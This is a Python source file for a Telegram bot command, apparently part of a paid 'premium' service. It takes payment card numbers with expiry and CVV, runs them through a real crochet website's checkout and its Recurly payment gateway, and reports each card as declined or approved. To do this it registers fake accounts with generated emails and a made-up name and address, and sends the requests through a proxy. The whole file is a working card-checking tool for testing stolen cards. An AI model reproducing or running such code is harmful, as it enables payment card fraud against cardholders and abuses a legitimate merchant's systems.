import time, asyncio, aiohttp
from src.extras.checklib import MakeGate, ScrapInfo
from datetime import datetime
from src.assets.functions import antispam
from src.assets.connection import Database
from pyrogram.types import Message
from pyrogram import Client, filters, enums
from pyrogram.enums import ParseMode

name_gate = "Recurly_Charged"
subtype = "60.00$ Charged"
command = "rec"


@Client.on_message(
    filters.command([f"{command}"], ["/", ",", ".", ";", "-"], case_sensitive=False)
)
async def gateway(client: Client, m: Message):
    card = (
        m.text.split(" ", 1)[1] if not m.reply_to_message else m.reply_to_message.text
    )
    user_id = m.from_user.id
    with Database() as db:
        if not db.IsPremium(user_id):
            return await m.reply("<b>You are not premium</b>", quote=True)
        user_info = db.GetInfoUser(m.from_user.id)
    if not card:
        return await m.reply("You need to provide a card to verify", quote=True)
    antispam_result = antispam(user_id, user_info["ANTISPAM"])
    if antispam_result != False:
        return await m.reply(
            f"Please wait <code>{antispam_result}'s</code>", quote=True
        )
    await client.send_chat_action(m.chat.id, action=enums.ChatAction.TYPING)
    card_splited = MakeGate(card).get_card_details()
    msgg = f"""<b>Checking... 🌩️</b>
━━━━━━━━━━━
<b>CC:</b> {card_splited[0]}:{card_splited[1]}:{card_splited[2]}:{card_splited[3]}
<b>Status:</b> Loading..."""
    msg = await m.reply(msgg, quote=True)
    asyncio.gather(get_live(card, msg))


async def get_live(card, msg):

    current_time = datetime.now().strftime("%D - %H:%M:%S")

    card_split = MakeGate(card).get_card_details()
    ccn = card_split[0]
    month = card_split[1]
    year = card_split[2]
    if len(year) == 2:
        year = f"20{card_split[2]}"
    cvv = card_split[3]

    if ccn[0] == "4":
        card_type = "Visa"
    elif ccn[0] == "5":
        card_type = "MasterCard"
    elif ccn[0] == "3":
        card_type = "AMEX"
    elif ccn[0] == "6":
        card_type = "DS"

    initial_time = time.time()
    data_bin = await MakeGate(card).bin_lookup()

    proxy = ScrapInfo().proxy_session()
    email = ScrapInfo().email_generator()

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ First Requests: get initial page ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    async with aiohttp.ClientSession() as session:

        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "es-419,es;q=0.9",
            "cache-control": "max-age=0",
            "priority": "u=0, i",
            "referer": "https://www.ilikecrochet.com/",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        }

        async with session.get(
            "https://www.ilikecrochet.com/subscribe-2col/gctmbfp59/", headers=headers
        ) as response:
            msgg = f"""<b>{current_time} 🌩️</b>
━━━━━━━━━━━
<b>CC:</b> {ccn}:{month}:{year}:{cvv}
<b>Status:</b> Loading...
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[0]}</code> - <code>{data_bin[1]}</code> - <code>{data_bin[2]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[3]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[4]} {data_bin[5]}</code>"""
            await msg.edit_text(
                msgg, parse_mode=ParseMode.HTML, disable_web_page_preview=True
            )

        # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Second Requests: Filling out the form ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

        headers = {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-language": "es-419,es;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.ilikecrochet.com",
            "priority": "u=1, i",
            "referer": "https://www.ilikecrochet.com/subscribe-2col/gctmbfp59/",
            "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
        }

        data = {
            "action": "process_ajax_reg",
            "mqsc": "WhiteWeb",
            "keycode": "",
            "ajax_source": "",
            "user_id": "",
            "first_name": "Leonel",
            "last_name": "Molina",
            "user_email": email,
            "address": "378 Av park",
            "address2": "",
            "city": "New York",
            "state": "NY",
            "zip_code": "10080",
            "country": "US",
            "require_subscribe_checkbox": "true",
            "subscribe_to_newsletters": "true",
            "auto_login": "true",
            "ecid": "NoFreebi-Order-01-PG",
        }

        async with session.post(
            "https://www.ilikecrochet.com/wp-admin/admin-ajax.php",
            headers=headers,
            data=data,
        ) as response:
            user_id = ScrapInfo().getStr(await response.text(), '"user_id":', ',"')

        # it returns something like this: {"finished":true,"user_id":1731621,"new_reg":1735505631,"message":"Registration Successful","subscribed":"false","user_email":"aXloZ2c0YnJyZW1AeWFob28uY29t"}

        # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Third req: processing the payment ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

        headers = {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-language": "es-419,es;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.ilikecrochet.com",
            "priority": "u=1, i",
            "referer": "https://www.ilikecrochet.com/subscribe-2col/gctmbfp59/",
            "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
        }

        params = {
            "mqOrder": "process",
        }

        data = {
            "payment_type": "recurly",
            "product_id": "21107",
            "offer_id": "44",
            "offersc": "",
            "user_id": user_id,
            "first_name": "Leonel",
            "last_name": "Molina",
            "user_email": email,
            "address": "378 Av park",
            "address2": "",
            "city": "New York",
            "state": "NY",
            "zip_code": "10080",
            "country": "US",
            "error_redirect_to": "ajax",
            "redirect_to": "ajax",
            "success_redirect_to": "ajax",
            "card_type": card_type,
            "card_number": ccn,
            "exp_month": month,
            "exp_year": year,
            "cvv": cvv,
        }

        async with session.post(
            "https://www.ilikecrochet.com/", params=params, headers=headers, data=data
        ) as response:

            if (
                "Your transaction was declined. Please use a different card or contact your bank."
                in await response.text()
            ):
                msgx = "DECLINED ❌"
                resultado = ScrapInfo().getStr(
                    await response.text(), '"errors":["', '"]'
                )

            elif (
                "The transaction was declined. Please use a different card contact your bank or contact support."
                in await response.text()
            ):
                msgx = "DECLINED ❌"
                resultado = ScrapInfo().getStr(
                    await response.text(), '"errors":["', '"]'
                )

            elif (
                "Your card number is not valid. Please update your card number."
                in await response.text()
            ):
                msgx = "DECLINED ❌"
                resultado = ScrapInfo().getStr(
                    await response.text(), '"errors":["', '"]'
                )

            elif (
                "The security code you entered does not match. Please update the CVV and try again."
                in await response.text()
            ):
                msgx = "APPROVED CVV/CCN ✅"
                resultado = ScrapInfo().getStr(
                    await response.text(), '"errors":["', '"]'
                )

            elif '"errors":["' in await response.text():
                msgx = "WIP"
                resultado = ScrapInfo().getStr(
                    await response.text(), '"errors":["', '"]'
                )
            else:
                resultado = await response.text()
                ScrapInfo().getIndex(await response)

        final_time = time.time() - initial_time

        card_response = f"""<b>#{name_gate} (${command}) 🌩️</b>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">↯</a> <b>CC:<b> [<code>{ccn}:{month}:{year}:{cvv}</code>]
<a href="https://t.me/ByDog3r">↯</a> <b>Status: {msgx}<b>
<a href="https://t.me/ByDog3r">↯</a> <b>Response:</b> {resultado}
<a href="https://t.me/ByDog3r">↯</a> <b>Gateway: {subtype}</b>
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[0]}</code> - <code>{data_bin[1]}</code> - <code>{data_bin[2]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[3]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[4]} {data_bin[5]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <b>Time</b> : {final_time:0.2}"""
        await msg.edit_text(
            card_response, parse_mode=ParseMode.HTML, disable_web_page_preview=True
        )
